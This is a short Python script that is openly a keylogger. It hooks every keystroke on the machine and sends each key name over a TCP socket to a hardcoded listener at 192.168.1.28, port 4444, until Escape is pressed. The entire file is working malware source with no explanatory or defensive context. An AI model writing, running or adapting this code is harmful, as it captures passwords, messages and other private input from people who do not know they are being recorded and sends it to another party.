import keyboard
import socket

def send_key_logs():
	host = '192.168.1.28'
	port = 4444

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))


	def on_key(event):
		if event.event_type == keyboard.KEY_DOWN:
			key = event.name
		try:
			 s.sendall(f'{key}\n'.encode())
		except:
			pass
		
	keyboard.hook(on_key)

	try:
		#print("Keylogger has been started....")
		keyboard.wait('esc')
	except KeyboardInterrupt:
		pass
	finally:
		keyboard.unhook_all()

if __name__ == "__main__":
	send_key_logs()

		







